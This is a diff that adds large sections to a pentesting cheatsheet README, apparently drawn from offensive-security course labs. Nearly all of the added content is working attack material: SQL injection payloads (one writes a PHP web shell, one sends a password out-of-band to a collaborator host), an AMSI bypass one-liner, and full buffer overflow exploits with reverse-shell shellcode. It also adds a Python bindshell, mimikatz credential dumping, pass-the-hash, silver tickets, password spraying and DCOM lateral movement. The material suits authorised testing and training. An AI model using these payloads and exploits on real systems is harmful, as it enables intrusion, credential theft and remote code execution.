@@ -169,7 +169,7 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Local File Inclusion (LFI)](#lfi)
   - [Macros](#macro)
   - [Network File System (NFS)](#nfs)
-  - [Operating System (OS) Vulnerabilities](#os)
+  - [OS command injection](#os)
   - [Other Vulnerabilities](#others)
   - [phpMyAdmin](#phpmyadmin)
   - [Privilege Escalation Linux (LIN)](#priv-lin)
@@ -3939,18 +3939,202 @@ cd cheatsheet-pentesting
   ```sql
   ' AND IF(1=1,SLEEP(5),0)--
   ```
+- **Sample query with LIMIT statement**:
+  ```sql
+  ' or 1=1 LIMIT 1;#
+  ```
 
+- **From SQL Injection to Code Execution**:
+  ```sql
+  #A SQL injection payload using the load_file function
+  #A SQL injection payload to write a PHP shell using the OUTFILE function
+  http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+  http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+  http://10.11.0.22/backdoor.php?cmd=id
+
+  ```
+- **SQL Injection various payloads**:
+  ```sql
+  ' --
+  '#
+  ''
+  %27--									//  '-- urlencoded 
+  %27%23									// '#  urlencoded
+  ' union select Null,'A',Null --
+  ' union select username,password from users --
+  ' union select Null,username||'~'||password from users--		//retrieving multiple values in a single column
+  'union select Null,Null from dual--					//oracle
+  'union select  Null,banner FROM v$version--				//querying the database type and version on Oracle
+  'union select Null,@@version#						//querying the database type and version on MySQL and Microsoft
+  'union select @@version,null--
+  'union select version(),null--										//postgresql
+  'union select table_name,null  from information_schema.tables						//postgresql
+  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--					//postgresql
+  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_fbfqft'-- 	//postgresql
+  '+union+select+username_ysxmhu,password_dlwxhb+from+users_fbfqft--					//postgresql
+  'union select null,null from dual--									//Oracle
+  ' union select table_name,null FROM all_tables--							//Oracle
+  ' union select column_name,null from all_tab_columns where table_name='USERS_HPFCUW'--			//Oracle
+  'union select PASSWORD_PTFGTC,USERNAME_WANPPW from USERS_HPFCUW--					//Oracle
+  a" UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4 as result -- -
+  a" UNION SELECT group_concat(user),group_concat(password),group_concat(authentication_string),4 FROM mysql.user -- -
+  1 union all select 1, 2, 3
+  '1 union all select 1, 2, 3 --
+  ```
+
+- **Blind SQL injection with conditional responses/errors**:
+  ```sql
+  TrackingId=xyz' AND '1'='1		
+  TrackingId=xyz' AND '1'='2
+  TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>6)='a
+  TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+  TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+  TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
+  TrackingId=xyz'
+  TrackingId=xyz''
+  TrackingId=xyz'||(SELECT '')||'
+  TrackingId=xyz'||(SELECT '' FROM dual)||'
+  TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+  TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+  TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+  TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+  TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+  TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+  TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+  ```
+- **Blind SQL injection with time delays and information retrieval**:
+  ```sql
+  TrackingId=x'||pg_sleep(10)--												
+  TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+  TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+  ```
+
+- **Blind SQL injection with out-of-band interaction**:
+  ```sql
+  TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//mndds9r47gg72qlar938g6csajga40sp.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--	
+  TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+  ```
+- **SQL injection with filter bypass via XML encoding  (Hackvertor)**:
+  ```sql
+   <@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
+
+  ```
 ### Antivirus (AV) Bypass
 - **AV Bypass Example**:
   ```bash
   echo 'This is a test' > test.exe
   ```
+- **Bypass AMSI oneliner**:
+  ```bash
+  [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+
+  ```
+
 
 ### Buffer Overflow (BOF) Linux (LIN)
 - **BOF Linux Example**:
   ```bash
   python -c "print 'A' * 5000" | nc -v 127.0.0.1 80
   ```
+- **Launching the debugger via terminal**:
+  ```python
+  edb
+  ```
+
+- **Proof of concept code to crash the Crossfire application**:
+  ```python
+  #!/usr/bin/python
+  import socket
+  
+  host = "10.11.0.128"
+  
+  crash = "\x41" * 4379
+  
+  buffer = "\x11(setup sound " + crash + "\x90\x00#"
+  
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  print "[*]Sending evil buffer..."
+  
+  s.connect((host, 13327))
+  print s.recv(1024)
+  
+  s.send(buffer)
+  s.close()
+  
+  print "[*]Payload Sent !"
+  ```
+
+- **Controlling EIP: Creating a unique buffer string using msf-pattern_create and Obtaining the overwrite offset**:
+  ```bash
+  msf-pattern_create -l 4379
+  msf-pattern_offset -q 46367046
+  ```
+
+- **Locating Space for Our Shellcode and Obtaining first stage shellcode opcodes**:
+  ```bash
+  msf-nasm_shell
+  nasm > add eax,12
+  00000000  83C00C            add eax,byte +0xc
+  
+  nasm > jmp eax
+  00000000  FFE0              jmp eax
+  ```
+
+- **Adding the first stage payload**:
+  ```bash
+  padding = "\x41" * 4368
+  eip = "\x42\x42\x42\x42"
+  first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
+
+  buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
+  ```
+
+- **Finding a Return Address:**:
+  ```bash
+  padding = "\x41" * 4368
+  eip = "\x96\x45\x13\x08"
+  first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
+
+  buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
+  ```
+  The EDB debugger comes with a set of plugins, one of which is named OpcodeSearcher. Using this plugin, we can easily search for a JMP ESP instruction or equivalent in the memory
+- **Generating a reverse shell**:
+  ```bash
+  msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode
+  ```
+
+- **Final exploit for the Crossfire application**:
+  ```python
+  host = "10.11.0.128"
+
+  nop_sled = "\x90" * 8  # NOP sled
+  
+  shellcode =  ""
+  shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
+  shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"
+  shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"
+  shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"
+  shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"
+  shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"
+  shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"
+  shellcode += "\x7f\x6d\x02\x36"
+  
+  padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
+  eip = "\x96\x45\x13\x08"  # 0x08134596
+  first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
+  
+  buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
+  ```
+
 
 ### Buffer Overflow (BOF) Windows (WIN)
 - **BOF Windows Example**:
@@ -3958,10 +4142,172 @@ cd cheatsheet-pentesting
   python -c "print 'A' * 2000" | nc -v 127.0.0.1 80
   ```
 
+- **Reproducing the buffer overflow**:
+  ```python
+  size = 800
+  inputBuffer = "A" * size
+  ```
+- **Controlling EIP**:
+  ```python
+  msf-pattern_create -l 800			#Creating a unique string
+  msf-pattern_offset -l 800 -q 42306142		#Finding the offset
+  ```
+- **Updated buffer string**:
+  ```python
+  filler = "A" * 780
+  eip = "B" * 4
+  buffer = "C" * 16
+  
+  inputBuffer = filler + eip + buffer
+  ```
+- **Locating Space for Our Shellcode**:
+  ```python
+  filler = "A" * 780
+  eip = "B" * 4
+  offset = "C" * 4
+  buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
+  ```
+- **Checking for Bad Characters**:
+  ```python
+  badchars = (
+  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
+  # other formats:
+  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+
+  #other format:
+  badchars = b""
+  badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+  badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+  badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+  badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+  badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+  badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+  badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+  badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+  badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+  badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+  badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+  badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+  badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+  badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+  badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+  badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" 
+  ```
+- **Finding the opcode of JMP ESP**:
+  ```python
+  ali@kali:~$ msf-nasm_shell
+  nasm > jmp esp
+  00000000  FFE4              jmp esp
+  nasm >
+  ```
+- **Finding a Return Address**:
+  ```python
+  !mona modules
+  !mona find -s "\xff\xe4" -m "libspp.dll"
+  ```
+- **Redirecting EIP**:
+  ```python
+   filler = "A" * 780
+  eip = "\x83\x0c\x09\x10"		#0x10090c83  the address entered is in reverse order
+  offset = "C" * 4
+  buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
+  
+  inputBuffer = filler + eip + offset + buffer
+  ```
+- **Generating shellcode to use ExitThread**:
+  ```python
+  msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.225 LPORT=443 EXITFUNC=thread -f py  –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7"
+  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.225 LPORT=443 EXITFUNC=thread -f py -v shellcode  –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7"
+
+  ```
+
+- **final code - getting the shell**:
+  ```python
+  filler = "A" * 780
+  eip = "\x83\x0c\x09\x10"
+  offset = "C" * 4
+  nops = "\x90" * 10
+  
+  inputBuffer = filler + eip + offset + nops + shellcode
+
+  ```
+
+- **Python script to fuzz SyncBreeze and identify the length**:
+  ```python
+  #!/usr/bin/python
+  import socket
+  import time
+  import sys
+  
+  size = 100
+  
+  while(size < 2000):
+    try:
+      print "\nSending evil buffer with %s bytes" % size
+    
+    inputBuffer = "A" * size
+    
+    content = "username=" + inputBuffer + "&password=A"
+
+    buffer = "POST /login HTTP/1.1\r\n"
+    buffer += "Host: 10.11.0.22\r\n"
+    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+    buffer += "Referer: http://10.11.0.22/login\r\n"
+    buffer += "Connection: close\r\n"
+    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+    buffer += "Content-Length: "+str(len(content))+"\r\n"
+    buffer += "\r\n"
+    
+    buffer += content
+
+    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+    
+    s.connect(("10.11.0.22", 80))
+    s.send(buffer)
+    
+    s.close()
+
+    size += 100
+    time.sleep(10)
+    
+    except:
+      print "\nCould not connect!"
+      sys.exit()
+  ```
+
 ### Access Control Vulnerabilities
 - **Access Control Vulnerability Example**:
   ```bash
   curl -H "Authorization: Bearer <token>" http://example.com/admin
+  ```
+- **basic tricks to check and bypass ACLs**:
+  ```bash
+  - Checking the Robots.txt
+  - X-Original-URL: /admin/						//Bypass access control with http header	
+  - Http-get to http-post						  //Bypass access control rules with changing the http request type
+  - Search in Comments/Scripts
+  - Search for links with uuid for other users
+  - Search for /admin-roles
+  - Referer header test to have more permissions (Referer: https://domain/admin)
+
   ```
 
 ### Active Directory (AD)
@@ -3969,17 +4315,270 @@ cd cheatsheet-pentesting
   ```bash
   ldapsearch -x -b "dc=example,dc=com" "(userPrincipalName=*)" 
   ```
+- **Running net user domain command**:
+  ```bash
+  net user /domain
+  net user tester /domain
+  ```
+- **PowerShell script to enumerate all users(To filter the results: $Searcher.filter="name=tester")**:
+  ```bash
+  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+  $PDC = ($domainObj.PdcRoleOwner).Name
+  
+  $SearchString = "LDAP://"
+  
+  $SearchString += $PDC + "/"
+  
+  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+  
+  $SearchString += $DistinguishedName
+  
+  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+  
+  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
+  
+  $Searcher.SearchRoot = $objDomain
+  
+  $Searcher.filter="samAccountType=805306368"
+  
+  $Result = $Searcher.FindAll()
+  
+  Foreach($obj in $Result)
+  {
+      Foreach($prop in $obj.Properties)
+      {
+          $prop
+      }
+      
+      Write-Host "------------------------"
+  }
+
+  ```
+- **Modified PowerShell script to enumerate all domain groups**:
+  ```bash
+  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+  $PDC = ($domainObj.PdcRoleOwner).Name
+  
+  $SearchString = "LDAP://"
+  
+  $SearchString += $PDC + "/"
+  
+  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+  
+  $SearchString += $DistinguishedName
+  
+  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+  
+  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
+  
+  $Searcher.SearchRoot = $objDomain
+  
+  $Searcher.filter="(objectClass=Group)"
+  
+  $Result = $Searcher.FindAll()
+  
+  Foreach($obj in $Result)
+  {
+      $obj.Properties.name
+  } 
+  ```
+- **PowerShell script to enumerate group members**:
+  ```bash
+  #Obtaining the members of Nested_Group $Searcher.filter="(name=Nested_Group)"
+  #Obtaining the members of Another_Nested_Group $Searcher.filter="(name=Another_Nested_Group)"
+  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  
+  $PDC = ($domainObj.PdcRoleOwner).Name
+  
+  $SearchString = "LDAP://"
+  
+  $SearchString += $PDC + "/"
+  
+  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+  
+  $SearchString += $DistinguishedName
+  
+  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+  
+  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
+  
+  $Searcher.SearchRoot = $objDomain
+  
+  $Searcher.filter="(name=Secret_Group)"
+  
+  $Result = $Searcher.FindAll()
+  
+  Foreach($obj in $Result)
+  {
+      $obj.Properties.member
+  }
+ 
+  ```
+- **PowerShell script to detect registered service principal names**:
+  ```bash
+  #Output: serviceprincipalname    {HTTP/CorpWebServer.corp.com}  --> nslookup CorpWebServer.corp.com
+  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  
+  $PDC = ($domainObj.PdcRoleOwner).Name
+  
+  $SearchString = "LDAP://"
+  $SearchString += $PDC + "/"
+  
+  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+  
+  $SearchString += $DistinguishedName
+  
+  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+  
+  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
+  
+  $Searcher.SearchRoot = $objDomain
+  
+  $Searcher.filter="serviceprincipalname=*http*"
+  
+  $Result = $Searcher.FindAll()
+  
+  Foreach($obj in $Result)
+  {
+      Foreach($prop in $obj.Properties)
+      {
+          $prop
+      }
+  } 
+  ```
+- **Authenticating using DirectoryEntry**:
+  ```bash
+  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  
+  $PDC = ($domainObj.PdcRoleOwner).Name
+  
+  $SearchString = "LDAP://"
+  $SearchString += $PDC + "/"
+  
+  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+  
+  $SearchString += $DistinguishedName
+  
+  New-Object System.DirectoryServices.DirectoryEntry($SearchString, "tester", "password")
+  ```
+- **Using Spray-Passwords.ps1 to attack user accounts**:
+  ```bash
+  PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass password! -Admin
+  Output: WARNING: also targeting admin accounts.
+  Performing brute force - press [q] to stop the process and print results...
+  Guessed password for user: 'Administrator' = 'password!'
+  Guessed password for user: 'tester' = 'password!'
+  ```
+- **Installing and importing PowerView(User enumeration using Get-NetLoggedon)**:
+  ```bash
+  Import-Module .\PowerView.ps1
+  Get-NetLoggedon -ComputerName client251
+  Get-NetSession -ComputerName dc01
+  ```
+- **Executing mimikatz on a domain workstation(Postexploit)**:
+  ```bash
+  #Dumping hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions
+  #Extracting Kerberos tickets with mimikatz
+  mimikatz.exe
+  mimikatz # privilege::debug
+  mimikatz # sekurlsa::logonpasswords
+  mimikatz # sekurlsa::tickets
+  mimikatz # kerberos::list /export
+  
+  #Overpass the Hash
+  #Creating a process with a different users NTLM password hash
+  mimikatz # sekurlsa::pth /user:tester /domain:corp.com /ntlm:e2b475c11da2dsdfd87aa966c327 /run:PowerShell.exe
+  
+  #Requesting a service ticket
+  #Calling the KerberosRequestorSecurityToken constructor by specifying the SPN with the -ArgumentList option
+  Add-Type -AssemblyName System.IdentityModel
+  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+  
+  #Displaying tickets
+  PS> klist
+  
+  #Cracking the ticket
+  sudo apt update && sudo apt install kerberoast
+  python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+  
+  # Passing the hash using pth-winexe
+  pth-winexe -U Administrator%aad3b435b51sdfaad3b435b51404ee:2892d26casdfe2eb3b9f05c425e //10.11.0.22 cmd
+  
+  
+  #Opening remote connection using Kerberos
+  #PsExec can run a command remotely but does not accept password hashes.
+  #Since we have generated Kerberos tickets and operate in the context of tester in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.
+  mimikatz# sekurlsa::pth /user:tester /domain:corp.com /ntlm:e2b475c1df748290d87aa966c327 /run:PowerShell.exe
+  
+  .\PsExec.exe \\dc01 cmd.exe
+  
+  #Pass the Ticket
+  #Creating a silver ticket for the iis_service service account
+  mimikatz # kerberos::purge
+  Ticket(s) purge for current session is OK
+  mimikatz # kerberos::list
+  mimikatz # kerberos::golden /user:tester-adm /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+  mimikatz # kerberos::list
+
+  ```
+- **Distributed Component Object Model(Code to create DCOM object and enumerate methods)**:
+  ```bash
+   $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+  $com | Get-Member
+  
+  #Distributed Component Object Model
+  #Proof of concept macro for Excel
+  #Copying the Excel document to the remote computer
+  #Opening the excel document on the DC
+  Sub mymacro()
+      Shell ("notepad.exe")
+  End Sub
+  
+  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+  
+  $LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+  
+  $RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+  
+  [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+  
+  $Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+  
+  $temp = [system.io.directory]::createDirectory($Path)
+  
+  $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+  
+  $com.Run("mymacro")
+  ```
 
 ### Bindshells
 - **Bindshell Example**:
   ```bash
   nc -lvp 4444 -e /bin/bash
   ```
+- **Bindshell python**:
+  ```bash
+  python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+  ```
 
 ### Brute Force
 - **Brute Force Attack Example**:
   ```bash
   hydra -l admin -P /path/to/passwords.txt ssh://target.com
+  ```
+- **Broken brute-force protection(The trick with multiple credentials per request)**:
+  ```bash
+  POST Request
+  Header
+  ...
+  
+  {"username":"tester","password":["fff",
+  "123456",
+  "password",
+  "12345678",
+  "qwerty"]
   ```
 
 ### Clickjacking
@@ -4057,6 +4656,11 @@ curl http://example.com/image?filename=../../../../../etc/passwd%00.png
   ```bash
   ftp -n -v 192.168.1.1
   ```
+- **FTP: Downloading all files from FTP**:
+  ```bash
+  wget -m ftp://anonymous:anonymous@10.10.10.98
+  wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
+  ```
 
 ### File Upload
 - **File Upload Example**:
@@ -4080,7 +4684,131 @@ curl http://example.com/image?filename=../../../../../etc/passwd%00.png
     }
   }
   ```
+- **GraphQL Common endpoint names**:
+  ```graphql
+  /graphql
+  /api
